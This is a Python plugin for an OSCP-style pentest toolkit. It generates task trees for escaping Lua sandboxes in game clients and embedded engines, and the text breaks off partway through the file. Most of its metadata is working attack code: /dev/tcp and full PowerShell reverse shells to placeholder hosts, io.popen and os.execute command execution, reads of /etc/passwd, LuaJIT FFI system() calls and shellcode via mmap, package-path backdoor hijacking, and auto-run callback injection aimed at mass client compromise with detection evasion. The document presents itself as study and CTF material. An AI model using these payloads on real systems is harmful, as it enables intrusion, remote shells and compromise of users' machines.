"""
Lua sandbox bypass and scripting engine exploitation plugin

Generates educational tasks for exploiting Lua sandboxes including:
- Global environment enumeration (_G dumping)
- Command execution via io/os primitives
- Bytecode loading exploitation
- LuaJIT FFI exploitation
- Output channel discovery
- Auto-run callback injection

This plugin focuses on CTF/game client exploitation techniques with
strong educational emphasis on manual enumeration and sandbox escape methodology.

Extracted from HackTricks: generic-methodologies-and-resources/lua/bypass-lua-sandboxes/
Generated by: CrackPot v1.0 for CRACK Track OSCP preparation toolkit
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LuaExploitPlugin(ServicePlugin):
    """Lua sandbox bypass and scripting engine exploitation guidance"""

    @property
    def name(self) -> str:
        return "lua-exploit"

    @property
    def default_ports(self) -> List[int]:
        # Lua scripting engines don't have standard ports
        # Often found in custom game servers or embedded applications
        return []

    @property
    def service_names(self) -> List[str]:
        return ['lua', 'luajit', 'lua5.1', 'lua5.2', 'lua5.3', 'lua-script', 'script-engine']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect potential Lua scripting engine scenarios

        This plugin activates when:
        - Service name contains 'lua'
        - Product mentions Lua scripting
        - Banner mentions Lua version
        - Common game server ports with Lua scripting support
        """
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        extrainfo = port_info.get('extrainfo', '').lower()
        port = port_info.get('port', 0)

        # Detect Lua in service name
        lua_indicators = [
            'lua',
            'luajit',
            'script',
            'scripting',
            'plugin-engine',
        ]

        # Check for Lua mentions in service/product/version
        if any(indicator in service for indicator in lua_indicators):
            return True

        if any(indicator in product for indicator in lua_indicators):
            return True

        if any(indicator in version for indicator in lua_indicators):
            return True

        if 'lua' in extrainfo:
            return True

        # Common game server ports that may have Lua scripting
        # (WoW, Minecraft mods, Garry's Mod, Roblox, etc.)
        game_server_ports = [
            3724,   # World of Warcraft
            25565,  # Minecraft
            27015,  # Source Engine games (Garry's Mod)
            53640,  # Roblox
        ]

        if port in game_server_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Lua exploitation task tree"""

        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'Lua scripting engine')
        service = service_info.get('service', 'lua')

        tasks = {
            'id': f'lua-exploit-{port}',
            'name': f'Lua Sandbox Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # ===== PHASE 1: RECONNAISSANCE =====
        recon_tasks = {
            'id': f'lua-recon-{port}',
            'name': 'Lua Environment Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: Initial connection and banner analysis
        recon_tasks['children'].append({
            'id': f'lua-banner-{port}',
            'name': 'Lua Service Banner Analysis',
            'type': 'command',
            'metadata': {
                'command': f'nc {target} {port}',
                'description': 'Connect to service and identify Lua scripting capabilities',
                'tags': ['OSCP:LOW', 'QUICK_WIN', 'MANUAL', 'RECON'],
                'flag_explanations': {
                    'nc': 'Netcat - network connection utility',
                    target: 'Target IP address',
                    str(port): f'Target port running {service} service'
                },
                'success_indicators': [
                    'Banner mentions Lua version (5.1, 5.2, 5.3, LuaJIT)',
                    'Script upload/execution interface available',
                    'Lua error messages visible'
                ],
                'failure_indicators': [
                    'Connection refused (service down)',
                    'Connection timeout (firewall blocking)',
                    'No Lua-specific banners or prompts'
                ],
                'next_steps': [
                    'Identify Lua version for exploit research',
                    'Look for script upload functionality',
                    'Test if interactive Lua console available',
                    'Check for authentication requirements'
                ],
                'alternatives': [
                    f'telnet {target} {port}',
                    f'ncat {target} {port}',
                    'Check web interface for Lua script upload',
                    'Look for game client with Lua modding support'
                ],
                'notes': 'Lua sandboxes are common in game clients, web app plugins, and embedded systems. Focus on finding script execution points.',
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 1.2: Enumerate global environment (_G)
        recon_tasks['children'].append({
            'id': f'lua-enum-globals-{port}',
            'name': 'Enumerate Global Environment (_G)',
            'type': 'manual',
            'metadata': {
                'description': 'Dump _G to discover available functions and dangerous primitives',
                'tags': ['OSCP:LOW', 'MANUAL', 'RECON', 'ENUM'],
                'success_indicators': [
                    'Full _G table dumped',
                    'Dangerous primitives identified (io, os, load, debug)',
                    'Custom functions/tables discovered'
                ],
                'failure_indicators': [
                    'No output mechanism available',
                    'Script execution blocked',
                    '_G access restricted'
                ],
                'next_steps': [
                    'Identify command execution primitives (io.popen, os.execute)',
                    'Look for bytecode loaders (load, loadstring, loadfile)',
                    'Check for debug library access',
                    'Find output channels if print() blocked'
                ],
                'alternatives': [
                    '''Lua script: Basic _G dumper
```lua
for k, v in pairs(_G) do
  print(tostring(k) .. " = " .. tostring(v))
end
```''',
                    '''Alternative with no print():
```lua
-- Use game UI/chat as output
function OnInit()
  local out = ""
  for k, v in pairs(_G) do
    out = out .. tostring(k) .. "=" .. type(v) .. " "
  end
  -- Use any available output primitive
  GamePrint(out)  -- or H.Say(), UIMessage(), etc.
end
```''',
                    '''Selective enumeration:
```lua
-- Check specific dangerous modules
print(io)        -- File I/O
print(os)        -- Command execution
print(load)      -- Bytecode loading
print(debug)     -- Debug hooks
print(package)   -- Module loading
```'''
                ],
                'notes': '''
KEY CONCEPT: _G enumeration reveals sandbox restrictions.

CRITICAL PRIMITIVES TO HUNT:
1. io.popen, os.execute → Command execution
2. load, loadstring, loadfile → Bytecode exploitation
3. package.loadlib, require → Native library loading
4. debug.* → VM manipulation
5. ffi.* (LuaJIT only) → Direct native code access

MANUAL METHODOLOGY:
- Treat VM as unknown environment
- Discover what's reachable before attempting exploits
- If print() blocked, repurpose any UI/IPC channel as output

OSCP RELEVANCE: Low for typical pentests, but valuable for:
- Game server CTF challenges
- IoT devices with Lua scripting
- Web apps with Lua plugin engines (e.g., OpenResty, mod_lua)
                '''
            }
        })

        # Task 1.3: Discover output channels
        recon_tasks['children'].append({
            'id': f'lua-output-channels-{port}',
            'name': 'Discover Alternative Output Channels',
            'type': 'manual',
            'metadata': {
                'description': 'Find output mechanisms when print() is disabled',
                'tags': ['OSCP:LOW', 'MANUAL', 'ENUM'],
                'success_indicators': [
                    'Found working output channel (chat, UI, logs)',
                    'Can exfiltrate data from sandbox',
                    'Reliable output function created'
                ],
                'next_steps': [
                    'Use output channel for _G enumeration',
                    'Test command execution with output redirect',
                    'Build reliable output wrapper function'
                ],
                'alternatives': [
                    '''Game chat output:
```lua
function ButlerOut(label)
  return function(msg)
    H.Say(label or 1, msg)  -- Game chat message
  end
end

local out = ButlerOut(1)
out("Testing output channel")
```''',
                    '''UI/Toast notifications:
```lua
function UIOut(msg)
  ShowNotification(msg)     -- In-game notification
  -- or GamePrint(msg)
  -- or UIMessage(msg)
end
```''',
                    '''Log file writes (if io.open allowed):
```lua
function LogOut(msg)
  local f = io.open("output.log", "a")
  if f then
    f:write(msg .. "\\n")
    f:close()
  end
end
```''',
                    '''Error messages as output:
```lua
-- Trigger controlled errors
error("OUTPUT: " .. data_to_exfiltrate)
```'''
                ],
                'notes': '''
OUTPUT CHANNEL DISCOVERY:
When print() is blocked, any string-accepting channel works:
- Game chat/say functions
- UI text boxes/toasts/notifications
- Log files (if io available)
- Network callbacks
- Error messages
- Sound/audio triggers (some require audio before output)

Example from AION housing VM:
```lua
H.PlaySound(0, "r[1]")  -- Required before H.Say() works
H.Say(1, "Output: " .. data)
```

MANUAL METHODOLOGY:
1. Review _G for UI/IPC functions
2. Test each with known string
3. Build wrapper for consistent output
4. Use for all subsequent recon
                '''
            }
        })

        tasks['children'].append(recon_tasks)

        # ===== PHASE 2: COMMAND EXECUTION =====
        command_exec_tasks = {
            'id': f'lua-command-exec-{port}',
            'name': 'Command Execution Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Test io/os primitives
        command_exec_tasks['children'].append({
            'id': f'lua-io-os-test-{port}',
            'name': 'Test io/os Command Execution',
            'type': 'manual',
            'metadata': {
                'description': 'Test for direct command execution via io.popen or os.execute',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'Command executed successfully',
                    'Output captured from io.popen',
                    'Process spawned via os.execute'
                ],
                'failure_indicators': [
                    'io/os modules not available',
                    'Sandbox blocks process creation',
                    'Functions return nil/error'
                ],
                'next_steps': [
                    'Establish reverse shell',
                    'Execute enumeration commands (id, whoami, ipconfig)',
                    'Upload additional payloads',
                    'Explore filesystem access'
                ],
                'alternatives': [
                    '''Windows command execution:
```lua
io.popen("calc.exe")
io.popen("cmd.exe /c whoami")
os.execute("powershell -c Get-Process")
```''',
                    '''Linux command execution:
```lua
io.popen("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
os.execute("cat /etc/passwd")
```''',
                    '''Command with output capture:
```lua
local handle = io.popen("whoami")
local result = handle:read("*a")
handle:close()
print(result)  -- or use custom output channel
```''',
                    '''Reverse shell (if io.popen available):
```lua
-- Linux
io.popen("/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")

-- Windows
io.popen("powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\"")
```'''
                ],
                'notes': '''
COMMAND EXECUTION PRIMITIVES:

1. io.popen(cmd) - Execute and capture output
   - Returns file handle for reading stdout
   - Use :read("*a") to get full output
   - More flexible than os.execute

2. os.execute(cmd) - Execute and return status
   - Returns exit code only
   - No output capture
   - Simpler but less useful

3. File I/O via io.open
   - Read sensitive files
   - Write web shells / backdoors
   - Modify application config

ANTI-CHEAT BYPASS:
Many game anti-cheats block external debuggers but NOT
in-VM process creation. Lua command execution happens
inside the game client process, often bypassing these protections.

OSCP CONTEXT:
Direct io/os access = immediate shell. But most hardened
sandboxes remove these modules. If blocked, proceed to
bytecode exploitation or LuaJIT FFI techniques.
                '''
            }
        })

        # Task 2.2: Zero-click auto-run callbacks
        command_exec_tasks['children'].append({
            'id': f'lua-auto-run-{port}',
            'name': 'Auto-Run Callback Injection',
            'type': 'manual',
            'metadata': {
                'description': 'Inject payload into auto-run hooks for zero-click exploitation',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'Payload executes on script load',
                    'No user interaction required',
                    'Works when script pushed to clients'
                ],
                'failure_indicators': [
                    'No auto-run hooks available',
                    'Hooks require authentication',
                    'Script validation blocks payloads'
                ],
                'next_steps': [
                    'Test all callback functions (OnInit, OnLoad, OnEnter, etc.)',
                    'Chain with server-side script injection',
                    'Use for persistence/backdoors'
                ],
                'alternatives': [
                    '''OnInit callback:
```lua
function OnInit()
  io.popen("calc.exe")  -- Executes immediately on load
end
```''',
                    '''OnLoad callback:
```lua
function OnLoad()
  -- Reverse shell on script load
  os.execute("bash -i >& /dev/tcp/attacker/4444 0>&1")
end
```''',
                    '''OnEnter (game context):
```lua
function OnEnter(player)
  -- Execute when player enters area
  io.popen("id > /tmp/pwned.txt")
end
```''',
                    '''Multiple hooks for reliability:
```lua
local payload = [[io.popen("calc.exe")]]

function OnInit()  load(payload)()  end
function OnLoad()  load(payload)()  end
function OnEnter() load(payload)()  end
```'''
                ],
                'notes': '''
AUTO-RUN CALLBACKS:

Common callback names across platforms:
- OnInit, OnInitialize
- OnLoad, OnScriptLoad
- OnEnter, OnPlayerEnter
- OnUpdate, OnTick
- OnEnable, OnStart

ZERO-CLICK EXPLOITATION:
If application pushes scripts to clients automatically
(game housing, plugin distribution, mod servers),
placing payload in auto-run hook creates drive-by exploit.

ATTACK CHAIN:
1. Find script upload/modification endpoint
2. Inject payload into auto-run callback
3. Wait for clients to load script
4. Mass compromise of all connected clients

DETECTION EVASION:
- Use obfuscation: base64 encode commands
- Split payload across multiple callbacks
- Conditional execution (only on specific triggers)

OSCP RELEVANCE: Low for typical exams, but critical
for CTF game server challenges and IoT exploitation.
                '''
            }
        })

        command_exec_tasks['children'].append(recon_tasks)

        tasks['children'].append(command_exec_tasks)

        # ===== PHASE 3: ADVANCED EXPLOITATION =====
        advanced_tasks = {
            'id': f'lua-advanced-{port}',
            'name': 'Advanced Lua Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: Bytecode loading exploitation
        bytecode_task = {
            'id': f'lua-bytecode-{port}',
            'name': 'Bytecode Loading Exploitation',
            'type': 'parent',
            'children': []
        }

        bytecode_task['children'].append({
            'id': f'lua-bytecode-test-{port}',
            'name': 'Test Bytecode Loading Functions',
            'type': 'manual',
            'metadata': {
                'description': 'Check if load/loadstring/loadfile are accessible',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'success_indicators': [
                    'load() function accessible',
                    'loadstring() works (Lua 5.1)',
                    'Can execute compiled bytecode'
                ],
                'failure_indicators': [
                    'Bytecode loaders removed from _G',
                    'Bytecode signature verification enforced',
                    'Functions return nil'
                ],
                'next_steps': [
                    'Identify Lua version (5.1, 5.2, 5.3)',
                    'Test bytecode verifier bypasses (5.1)',
                    'Research version-specific exploits',
                    'Craft memory corruption primitives'
                ],
                'alternatives': [
                    '''Test load function:
```lua
-- Execute Lua source code
local f = load("return 1+1")
print(f())  -- Should print 2
```''',
                    '''Test loadstring (Lua 5.1):
```lua
-- Load from string (5.1 alias for load)
local g = loadstring("return 0x1337")
print(g())  -- Should print 4919
```''',
                    '''Test bytecode execution:
```lua
-- Compile function to bytecode
local func = function() return 0x41414141 end
local bc = string.dump(func)

-- Load and execute bytecode
local loaded = load(bc)
print(loaded())  -- Should print 0x41414141
```''',
                    '''Check for loadfile:
```lua
-- Load Lua file
local script = loadfile("test.lua")
if script then script() end
```'''
                ],
                'notes': '''
BYTECODE LOADING OVERVIEW:

Critical functions:
1. load(chunk [, chunkname [, mode [, env]]])
   - Lua 5.2+: Load source or bytecode
   - Mode controls: "t" (text), "b" (binary), "bt" (both)

2. loadstring(string [, chunkname])
   - Lua 5.1: Alias for load
   - Can execute precompiled bytecode

3. loadfile(filename [, mode [, env]])
   - Load from file (source or bytecode)

4. dofile(filename)
   - Load and execute file immediately

SECURITY IMPLICATIONS:

Lua ≤5.1:
- Ships bytecode verifier with known bypasses
- Crafted bytecode can exploit verifier bugs
- Enable memory corruption primitives

Lua 5.2+:
- Removed verifier (official stance: reject bytecode)
- If bytecode loading allowed, wider attack surface
- Type confusion via opcodes (FORLOOP, etc.)

EXPLOITATION PATH:
1. Leak pointers via output channel
2. Craft malicious bytecode (type confusion)
3. Load via load()/loadstring()
4. Achieve arbitrary read/write
5. Pivot to native code execution

OSCP NOTE: Highly advanced, requires reverse engineering.
Focus on understanding concepts for CTF scenarios.
                '''
            }
        })

        bytecode_task['children'].append({
            'id': f'lua-bytecode-exploit-{port}',
            'name': 'Bytecode Exploitation Guide',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit crafted bytecode for memory corruption',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL', 'ADVANCED'],
                'alternatives': [
                    'Research: Lua bytecode verifier bypasses (5.1)',
                    'Research: FORLOOP opcode type confusion',
                    'Tool: lua-bytecode-exploiter (custom)',
                    'Reference: Factorio RCE (memorycorruption.net)',
                    'Reference: AION housing exploit (appsec.space)'
                ],
                'notes': '''
BYTECODE EXPLOITATION WORKFLOW:

Phase 1: Reconnaissance
- Identify exact Lua version
- Confirm load/loadstring accessible
- Test bytecode execution
- Find output channel for leaks

Phase 2: Pointer Leakage
- Leak stack addresses via _G enumeration
- Leak heap addresses via crafted objects
- Calculate base addresses (defeat ASLR)

Phase 3: Bytecode Crafting
- Study target Lua VM internals (TValue, Proto, etc.)
- Identify exploitable opcodes:
  * FORLOOP: Integer overflow → type confusion
  * GETUPVAL/SETUPVAL: Out-of-bounds access
  * CLOSURE: Prototype pointer confusion
- Craft malicious bytecode with:
  * Invalid register references
  * Oversized stack frames
  * Type confusion primitives

Phase 4: Primitive Construction
- Arbitrary read: Craft TValue with pointer as string
- Arbitrary write: Use setupvalue on crafted closure
- Function pointer overwrite: Target GC metamethods

Phase 5: Code Execution
- Overwrite __gc metamethod → hijack GC cycle
- Overwrite function pointer → hijack next call
- ROP chain from leaked addresses
- Shellcode execution via JIT (if LuaJIT)

TOOLS & REFERENCES:

Published Exploits:
- Factorio RCE (2022): FORLOOP integer overflow
  https://memorycorruption.net/posts/rce-lua-factorio/

- AION Housing (2023): load() bytecode exploitation
  https://appsec.space/posts/aion-housing-exploit/

- Bytecode verifier bypasses (gist):
  https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16

Lua Version Differences:
- 5.1: Verifier present but bypassable
- 5.2: Verifier removed (official: reject bytecode)
- 5.3: Similar to 5.2
- LuaJIT: Different VM, FFI provides easier path

OSCP RELEVANCE:
Extremely low for typical pentests. Relevant for:
- High-stakes CTF competitions
- Game client exploitation research
- IoT device reverse engineering

MANUAL METHODOLOGY:
This is advanced exploitation requiring:
- Lua VM internals knowledge
- Binary analysis (IDA/Ghidra)
- Debugger (gdb with Lua extensions)
- Custom bytecode assembler

NOT practical for OSCP exam scenarios.
Focus on io/os exploitation and LuaJIT FFI instead.
                '''
            }
        })

        advanced_tasks['children'].append(bytecode_task)

        # Task 3.2: LuaJIT FFI exploitation
        advanced_tasks['children'].append({
            'id': f'luajit-ffi-{port}',
            'name': 'LuaJIT FFI Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit LuaJIT Foreign Function Interface for native code execution',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL', 'ADVANCED'],
                'success_indicators': [
                    'ffi module accessible',
                    'Can define C functions with ffi.cdef',
                    'Can load native libraries with ffi.load',
                    'Direct memory access via ffi.cast'
                ],
                'failure_indicators': [
                    'ffi module not loaded (not LuaJIT)',
                    'ffi access restricted',
                    'Library loading blocked'
                ],
                'next_steps': [
                    'Call system() directly via FFI',
                    'Load native libraries (libc, kernel32)',
                    'Arbitrary memory read/write',
                    'Shellcode execution'
                ],
                'alternatives': [
                    '''Check if FFI available:
```lua
if jit and ffi then
  print("LuaJIT with FFI detected")
end
```''',
                    '''Call system() directly (Linux):
```lua
local ffi = require("ffi")
ffi.cdef[[
  int system(const char *command);
]]
ffi.C.system("id")  -- Execute command
```''',
                    '''Call system() directly (Windows):
```lua
local ffi = require("ffi")
ffi.cdef[[
  int system(const char *command);
]]
ffi.C.system("calc.exe")
```''',
                    '''Load library and call functions:
```lua
local ffi = require("ffi")
ffi.cdef[[
  void *malloc(size_t size);
  void free(void *ptr);
]]
local buf = ffi.C.malloc(1024)
-- Use buffer
ffi.C.free(buf)
```''',
                    '''Arbitrary memory access:
```lua
local ffi = require("ffi")
-- Cast integer to pointer
local ptr = ffi.cast("uint8_t*", 0x400000)
-- Read memory
local value = ptr[0]
-- Write memory
ptr[0] = 0x90  -- NOP
```''',
                    '''Shellcode execution:
```lua
local ffi = require("ffi")
ffi.cdef[[
  void* mmap(void*, size_t, int, int, int, long);
  int mprotect(void*, size_t, int);
]]
-- Allocate executable memory
local PROT_READ = 1
local PROT_WRITE = 2
local PROT_EXEC = 4
local MAP_PRIVATE = 2
local MAP_ANONYMOUS = 0x20

local shellcode = "\\x90\\x90\\x90\\xc3"  -- NOP NOP NOP RET
local mem = ffi.C.mmap(nil, #shellcode,
                       PROT_READ + PROT_WRITE + PROT_EXEC,
                       MAP_PRIVATE + MAP_ANONYMOUS, -1, 0)
ffi.copy(mem, shellcode)

-- Cast to function and call
local func = ffi.cast("int (*)(void)", mem)
func()
```'''
                ],
                'notes': '''
LUAJIT FFI EXPLOITATION:

LuaJIT Foreign Function Interface (FFI) provides direct
access to C functions and memory, bypassing sandbox entirely.

CRITICAL CAPABILITIES:

1. ffi.cdef(declaration)
   - Define C function signatures
   - Access any C library function

2. ffi.C.function_name
   - Direct C function calls
   - No VM restrictions

3. ffi.load(library)
   - Load native libraries (.so, .dll)
   - Access custom functions

4. ffi.cast(type, value)
   - Type casting (integer ↔ pointer)
   - Arbitrary memory access

5. ffi.copy(dst, src, len)
   - Memory copy primitive
   - Write shellcode to memory

EXPLOITATION PATH:

Easy Route (if ffi accessible):
1. ffi.C.system("command") → immediate shell
2. No bytecode exploitation needed
3. No memory corruption required

Advanced Route:
1. Use ffi.cast for arbitrary read/write
2. Leak ASLR addresses via memory reads
3. Overwrite GOT/IAT entries
4. Execute shellcode via mmap/VirtualAlloc

COMMON TARGETS:

Linux:
- ffi.C.system(cmd) → immediate execution
- ffi.C.popen(cmd) → capture output
- Load libc.so → full libc access

Windows:
- ffi.C.system(cmd) → cmd.exe execution
- Load kernel32.dll → Windows API
- WinExec, ShellExecute for GUI apps

OSCP RELEVANCE:
Low for typical exams, but if you find LuaJIT:
- FFI is fastest path to shell
- Much easier than bytecode exploitation
- Check ffi module first before complex attacks

DETECTION:
Most game developers now disable FFI in sandboxes.
Check with: if ffi then print("FFI available") end

MANUAL METHODOLOGY:
1. Confirm LuaJIT (jit table present)
2. Check ffi module (require "ffi")
3. Test system() call
4. Establish reverse shell
5. Skip complex bytecode attacks
                '''
            }
        })

        # Task 3.3: Package/require exploitation
        advanced_tasks['children'].append({
            'id': f'lua-package-exploit-{port}',
            'name': 'Package Loading Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit package.loadlib and require for native library loading',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'package.loadlib accessible',
                    'Can load native libraries (.so/.dll)',
                    'require() works with native modules'
                ],
                'next_steps': [
                    'Load malicious native library',
                    'Hijack package.path for Lua module injection',
                    'Use package.loaded to persist code'
                ],
                'alternatives': [
                    '''Test package.loadlib:
```lua
-- Load native library
local lib = package.loadlib("./malicious.so", "luaopen_malicious")
if lib then
  local module = lib()
  -- Use module
end
```''',
                    '''Hijack package.path:
```lua
-- Add malicious path first
package.path = "/tmp/evil/?.lua;" .. package.path
require("backdoor")  -- Loads /tmp/evil/backdoor.lua
```''',
                    '''Persist via package.loaded:
```lua
-- Inject into loaded modules
package.loaded.backdoor = {
  execute = function(cmd)
    return io.popen(cmd):read("*a")
  end
}
-- Now available: require("backdoor").execute("id")
```''',
                    '''Debug library access (if available):
```lua
-- Check debug table
if debug then
  print("Debug library available!")
  -- getupvalue/setupvalue for variable access
  -- setfenv/getfenv for environment manipulation (5.1)
  -- getinfo for function introspection
end
```'''
                ],
                'notes': '''
PACKAGE/REQUIRE EXPLOITATION:

package.loadlib(libname, funcname):
- Load native library (.so on Linux, .dll on Windows)
- Call initialization function
- Returns Lua module
- Enables arbitrary native code execution

require(modname):
- Search package.path and package.cpath
- Load Lua or native modules
- Can be hijacked by path manipulation

DEBUG LIBRARY:

If debug table accessible:
- debug.getupvalue/setupvalue: Access function variables
- debug.setfenv/getfenv (5.1): Change function environment
- debug.getinfo: Function introspection
- debug.sethook: Execution hooks

EXPLOITATION STRATEGIES:

1. Native Library Loading:
   - Compile malicious .so/.dll
   - Upload to writable path
   - package.loadlib to execute

2. Path Hijacking:
   - Prepend malicious path to package.path
   - Place backdoor module in that path
   - Any require() loads our code

3. Module Injection:
   - Inject into package.loaded table
   - Persist malicious code
   - Survives sandbox resets

4. Debug Hooks:
   - debug.sethook for execution tracing
   - Hook every function call
   - Log/modify execution flow

OSCP RELEVANCE:
Low for typical pentests. Useful for:
- IoT device exploitation
- CTF game challenges
- Custom Lua applications

MANUAL METHODOLOGY:
1. Check package and debug in _G
2. Test loadlib with benign library
3. Craft malicious native module
4. Upload and load
5. Establish persistence
                '''
            }
        })

        tasks['children'].append(advanced_tasks)

        # ===== PHASE 4: HARDENING & DETECTION =====
        tasks['children'].append({
            'id': f'lua-defense-{port}',
            'name': 'Hardening & Detection Notes',
            'type': 'manual',
            'metadata': {
                'description': 'Defensive measures and detection strategies',
                'tags': ['RESEARCH', 'MANUAL'],
                'notes': '''
DEFENSIVE HARDENING (for developers):

Server-Side Protection:
1. Reject/rewrite user scripts before execution
2. Allowlist safe APIs only (string, table, math)
3. Remove dangerous modules:
   - io (file I/O)
   - os (command execution)
   - load/loadstring/loadfile/dofile (bytecode)
   - package.loadlib (native libraries)
   - debug (VM manipulation)
   - ffi (LuaJIT direct native access)

4. Sandbox with minimal _ENV:
```lua
local safe_env = {
  string = string,
  table = table,
  math = math,
  -- Only safe modules
}
local func = load(user_script, nil, "t", safe_env)
```

Client-Side Protection:
1. Run Lua with minimal _ENV (no globals)
2. Forbid bytecode loading (mode="t" in load())
3. Implement strict bytecode verifier or signatures
4. Block process creation from client process
5. Monitor child process creation

Detection & Monitoring:
1. Alert on game_client.exe → child process creation
2. Correlate with script load events
3. Monitor UI/chat for suspicious output patterns
4. Log all Lua errors and access violations
5. Signature-based detection:
   - io.popen, os.execute in scripts
   - require "ffi" in LuaJIT
   - load/loadstring calls
   - package.loadlib usage

Network Telemetry:
1. Detect script upload from untrusted sources
2. Monitor for obfuscated Lua code
3. Track outbound connections from game client
4. Alert on base64/hex encoded strings in scripts

OSCP CONTEXT (as attacker):

If you find Lua scripting:
1. Enumerate _G first (know your sandbox)
2. Check for command execution (io/os)
3. Test LuaJIT FFI (if LuaJIT detected)
4. Check package.loadlib
5. Only attempt bytecode exploitation if all else fails

For OSCP exam:
- Unlikely to encounter Lua exploitation
- More common in CTF game challenges
- Understand concepts for bonus points
- Focus on web/network services first

Time Management:
- Quick _G enumeration: 5 minutes
- io/os testing: 5 minutes
- FFI testing (LuaJIT): 10 minutes
- Bytecode exploitation: SKIP (too time-consuming)

Total recommended time: 20 minutes max
If no quick wins, move to other services.
                '''
            }
        })

        # ===== PHASE 5: RESOURCES =====
        tasks['children'].append({
            'id': f'lua-resources-{port}',
            'name': 'Research Resources & References',
            'type': 'manual',
            'metadata': {
                'description': 'External resources for Lua exploitation research',
                'tags': ['RESEARCH', 'MANUAL'],
                'alternatives': [
                    'AION Housing RCE: https://appsec.space/posts/aion-housing-exploit/',
                    'Factorio Lua RCE: https://memorycorruption.net/posts/rce-lua-factorio/',
                    'Lua 5.1 bytecode exploits: https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16',
                    'Lua-users.org bytecode verifier discussion (2009)',
                    'LuaJIT FFI documentation: http://luajit.org/ext_ffi.html',
                    'GTFOBins Lua: https://gtfobins.github.io/gtfobins/lua/',
                    'Lua manual: https://www.lua.org/manual/',
                    'Awesome Lua Security: https://github.com/trickster0/Awesome-Lua-Security'
                ],
                'notes': '''
ESSENTIAL READING:

1. AION Housing Exploit (2023)
   - Real-world game client RCE
   - Demonstrates _G enumeration
   - Output channel discovery
   - Auto-run callback injection
   - Full exploitation chain

2. Factorio RCE (2022)
   - Bytecode exploitation details
   - FORLOOP integer overflow
   - Type confusion primitives
   - Memory corruption techniques

3. Lua Bytecode Verifier Discussion (2009)
   - Official decision to remove verifier
   - Known bypass techniques
   - Historical context

TOOLS:

- LuaDec: Lua bytecode decompiler
- luac: Lua compiler (for bytecode analysis)
- CheatEngine: Game memory editing (for VM analysis)
- IDA/Ghidra: Reverse engineering Lua VM
- GDB with Lua extensions: Debugging

PRACTICE ENVIRONMENTS:

- Set up local Lua sandbox
- Practice _G enumeration
- Test exploitation techniques safely
- CTF challenges:
  * HackTheBox game challenges
  * PicoCTF Lua challenges
  * Google CTF past problems

OSCP PREPARATION:

While Lua exploitation is unlikely in OSCP:
1. Understand sandbox escape concepts
2. Apply methodology to other interpreters:
   - Python sandboxes
   - PHP disable_functions bypass
   - Node.js vm module escapes
3. Practice enumeration methodology
4. Manual testing over automated tools

Time Investment Recommendation:
- Core concepts: 2-3 hours
- Hands-on practice: 5-10 hours
- Advanced techniques: 20+ hours (optional)

OSCP Priority: LOW
Focus on high-value targets first (web, SMB, SQL).
                '''
            }
        })

        return tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Parse results and spawn additional tasks"""
        new_tasks = []

        # If _G enumeration finds dangerous primitives
        if 'enum-globals' in task_id:
            port = task_id.split('-')[-1]

            # Check for command execution primitives
            if 'io' in result.lower() or 'os' in result.lower():
                new_tasks.append({
                    'id': f'lua-cmd-exec-confirmed-{port}',
                    'name': 'Command Execution Primitives Found',
                    'type': 'manual',
                    'metadata': {
                        'description': 'io/os modules detected - proceed to command execution testing',
                        'tags': ['OSCP:LOW', 'EXPLOIT'],
                        'notes': 'High-value finding: Direct command execution may be possible via io.popen or os.execute'
                    }
                })

            # Check for LuaJIT FFI
            if 'ffi' in result.lower() or 'jit' in result.lower():
                new_tasks.append({
                    'id': f'luajit-ffi-confirmed-{port}',
                    'name': 'LuaJIT FFI Detected',
                    'type': 'manual',
                    'metadata': {
                        'description': 'LuaJIT FFI available - easiest path to native code execution',
                        'tags': ['OSCP:LOW', 'EXPLOIT'],
                        'notes': 'PRIORITY: FFI provides direct C function access. Test ffi.C.system() immediately.'
                    }
                })

            # Check for bytecode loaders
            if 'load' in result.lower() or 'loadstring' in result.lower():
                new_tasks.append({
                    'id': f'lua-bytecode-loaders-{port}',
                    'name': 'Bytecode Loaders Available',
                    'type': 'manual',
                    'metadata': {
                        'description': 'load/loadstring detected - advanced exploitation possible',
                        'tags': ['OSCP:LOW', 'EXPLOIT'],
                        'notes': 'If io/os blocked, bytecode exploitation may provide alternative path (advanced)'
                    }
                })

        # If command execution confirmed
        if 'io-os-test' in task_id and ('executed' in result.lower() or 'success' in result.lower()):
            port = task_id.split('-')[-1]
            new_tasks.append({
